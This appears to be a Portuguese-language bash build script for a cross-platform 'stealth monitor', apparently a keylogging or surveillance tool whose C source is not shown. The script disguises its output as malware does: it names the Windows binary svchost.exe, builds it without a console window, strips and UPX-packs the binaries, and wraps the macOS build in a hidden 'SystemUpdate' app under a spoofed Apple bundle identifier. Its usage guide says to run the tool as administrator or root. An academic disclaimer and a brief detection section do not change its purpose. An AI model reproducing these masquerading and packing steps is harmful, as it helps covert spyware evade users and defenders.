#!/bin/bash

echo "🚀 COMPILANDO PROJETO CIENTÍFICO MULTI-PLATAFORMA"
echo "=================================================="

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Função para compilar Windows (cross-compile)
build_windows() {
    echo -e "${BLUE}[WINDOWS]${NC} Compilando monitor stealth..."
    
    if command -v x86_64-w64-mingw32-gcc &> /dev/null; then
        cd ../windows
        x86_64-w64-mingw32-gcc -O3 -s -mwindows -static \
            -o svchost.exe win_stealth_monitor.c \
            -luser32 -lkernel32 -ladvapi32 -lpsapi -lws2_32 \
            -Wl,--strip-all,--no-insert-timestamp
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}✓ Windows build successful: svchost.exe${NC}"
            
            # Aplicar packer se disponível
            if command -v upx &> /dev/null; then
                upx --ultra-brute svchost.exe 2>/dev/null
                echo -e "${GREEN}✓ Binary packed with UPX${NC}"
            fi
        else
            echo -e "${RED}✗ Windows build failed${NC}"
        fi
        cd ../build
    else
        echo -e "${YELLOW}⚠ MinGW not found, skipping Windows build${NC}"
    fi
}

# Função para compilar Linux
build_linux() {
    echo -e "${BLUE}[LINUX]${NC} Compilando monitor stealth..."
    
    cd ../linux
    gcc -O3 -s -o system-monitor linux_stealth_monitor.c \
        -lX11 -lXext -lpthread \
        -Wl,--strip-all
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✓ Linux build successful: system-monitor${NC}"
        
        # Aplicar packer se disponível
        if command -v upx &> /dev/null; then
            upx --ultra-brute system-monitor 2>/dev/null
            echo -e "${GREEN}✓ Binary packed with UPX${NC}"
        fi
        
        # Tornar executável
        chmod +x system-monitor
    else
        echo -e "${RED}✗ Linux build failed${NC}"
        echo -e "${YELLOW}Tentando build sem static linking...${NC}"
        
        gcc -O3 -s -o system-monitor linux_stealth_monitor.c \
            -lX11 -lXext -lpthread
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}✓ Linux build successful (dynamic): system-monitor${NC}"
            chmod +x system-monitor
        fi
    fi
    cd ../build
}

# Função para compilar macOS
build_macos() {
    echo -e "${BLUE}[MACOS]${NC} Compilando monitor stealth..."
    
    if [[ "$OSTYPE" == "darwin"* ]]; then
        cd ../macos
        clang -O3 -framework CoreFoundation -framework CoreGraphics \
              -framework ApplicationServices -framework Carbon \
              -o SystemUpdate macos_stealth_monitor.c
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}✓ macOS build successful: SystemUpdate${NC}"
            chmod +x SystemUpdate
            
            # Criar bundle se necessário
            if [ ! -d "SystemUpdate.app" ]; then
                mkdir -p SystemUpdate.app/Contents/MacOS
                mv SystemUpdate SystemUpdate.app/Contents/MacOS/
                
                cat > SystemUpdate.app/Contents/Info.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>SystemUpdate</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.systemupdate</string>
    <key>CFBundleName</key>
    <string>System Update</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>LSUIElement</key>
    <true/>
</dict>
</plist>
EOF
                echo -e "${GREEN}✓ macOS app bundle created${NC}"
            fi
        else
            echo -e "${RED}✗ macOS build failed${NC}"
        fi
        cd ../build
    else
        echo -e "${YELLOW}⚠ Not running on macOS, skipping macOS build${NC}"
    fi
}

# Função para criar documentação
create_docs() {
    echo -e "${BLUE}[DOCS]${NC} Gerando documentação científica..."
    
    cd ../research
    
    cat > usage_guide.md << 'EOF'
# 🎓 Guia de Uso Científico

## ⚠️ AVISO LEGAL
Este projeto é destinado EXCLUSIVAMENTE para:
- Pesquisa acadêmica em segurança cibernética
- Treinamento de Blue Team e Red Team
- Análise de comportamento de sistemas
- Desenvolvimento de contramedidas

**NÃO USE PARA ATIVIDADES ILEGAIS!**

## Uso por Plataforma

### Windows
```bash
# Executar como administrador
svchost.exe

# Verificar execução
tasklist | findstr svchost
```

### Linux
```bash
# Executar como root (recomendado)
sudo ./system-monitor

# Verificar execução
ps aux | grep system-monitor
```

### macOS
```bash
# Executar (requer permissões de acessibilidade)
./SystemUpdate.app/Contents/MacOS/SystemUpdate

# Verificar execução
ps aux | grep SystemUpdate
```

## Detecção (Blue Team)

### Indicadores de Compromisso
- Processos com nomes genéricos do sistema
- Conexões DNS suspeitas para domínios não conhecidos
- Hooks de baixo nível em APIs críticas
- Arquivos temporários com padrões específicos

### Ferramentas de Detecção
- Process Monitor (Windows)
- Wireshark para análise de tráfego
- Volatility para análise de memória
- YARA rules para detecção de padrões

## Contramedidas

### Prevenção
- Monitoramento de APIs sensíveis
- Whitelist de processos autorizados
- Análise comportamental
- Sandboxing de aplicações

### Detecção
- EDR (Endpoint Detection and Response)
- SIEM com regras específicas
- Honeypots para capturar atividade
- Machine Learning para detecção de anomalias
EOF

    echo -e "${GREEN}✓ Documentação criada${NC}"
    cd ../build
}

# Função principal
main() {
    echo -e "${YELLOW}Iniciando compilação multi-plataforma...${NC}"
    echo ""
    
    # Verificar dependências
    echo -e "${BLUE}[DEPS]${NC} Verificando dependências..."
    
    # Verificar compiladores
    if command -v gcc &> /dev/null; then
        echo -e "${GREEN}✓ GCC encontrado${NC}"
    else
        echo -e "${RED}✗ GCC não encontrado${NC}"
    fi
    
    if command -v clang &> /dev/null; then
        echo -e "${GREEN}✓ Clang encontrado${NC}"
    else
        echo -e "${YELLOW}⚠ Clang não encontrado${NC}"
    fi
    
    echo ""
    
    # Compilar para cada plataforma
    build_linux
    echo ""
    build_windows
    echo ""
    build_macos
    echo ""
    create_docs
    
    echo ""
    echo -e "${GREEN}🎉 COMPILAÇÃO CONCLUÍDA!${NC}"
    echo -e "${YELLOW}📚 Leia research/usage_guide.md antes de usar${NC}"
    echo -e "${RED}⚠️  Use apenas para fins educacionais e legais!${NC}"
}

# Executar função principal
main "$@"